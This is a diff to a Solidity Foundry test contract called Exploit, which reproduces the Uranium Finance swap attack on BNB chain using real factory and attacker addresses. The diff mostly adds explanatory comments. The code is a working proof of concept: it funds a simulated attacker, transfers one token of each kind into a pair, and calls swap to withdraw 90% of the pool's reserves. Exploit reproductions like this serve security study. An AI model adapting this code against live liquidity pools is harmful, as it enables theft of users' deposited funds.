@@ -109,10 +109,7 @@ interface IUraniumPair {
  */
 
 contract Constants {
-    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
-    address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
-    address constant uraniumFactory =
-        0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
+    address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
     address constant attacker = 0xC47BdD0A852a88A019385ea3fF57Cf8de79F019d;
     IUraniumFactory factory = IUraniumFactory(uraniumFactory);
 }
@@ -131,18 +128,20 @@ contract Exploit is Test, Constants {
     }
 
     function attack(uint256 pairNumber) public {
+        // get current token pair contract
         address currentPair = factory.allPairs(pairNumber);
         IUraniumPair pair = IUraniumPair(currentPair);
 
+        // get tokens being used in this pair contract
         address token0Address = pair.token0();
-        address token1Address = pair.token1();
-
         IBEP20 token0 = IBEP20(token0Address);
-        IBEP20 token1 = IBEP20(token1Address);
-
         string memory token0Sym = token0.symbol();
+ 
+        address token1Address = pair.token1();
+        IBEP20 token1 = IBEP20(token1Address);
         string memory token1Sym = token1.symbol();
 
+        // snyc again to get the latest update of the token reserves in the contract
         pair.sync();
         (uint112 res0, uint112 res1, ) = pair.getReserves();
 
@@ -150,21 +149,20 @@ contract Exploit is Test, Constants {
         emit log("Reserves: ");
         emit log_named_uint(token0Sym, res0 / 1e18);
         emit log_named_uint(token1Sym, res1 / 1e18);
-
-        emit log_named_uint(
-            "Minimum liquidity of the pool: ",
-            pair.MINIMUM_LIQUIDITY()
-        );
-
+        
+        // withdraw 90% of all reserves
         uint256 withdraw0 = (90 * res0) / 100;
         uint256 withdraw1 = (90 * res1) / 100;
 
+        // give fake ETH to attacker for simulation
         deal(token0Address, attacker, 2e18);
         deal(token1Address, attacker, 2e18);
 
+        // transfer 1 ETH into LP to add to amountIn
         token0.transfer(currentPair, 1e18);
         token1.transfer(currentPair, 1e18);
 
+        // execute the swap function on the target contract
         pair.swap(withdraw0, withdraw1, attacker, "");
 
         emit log(" ");
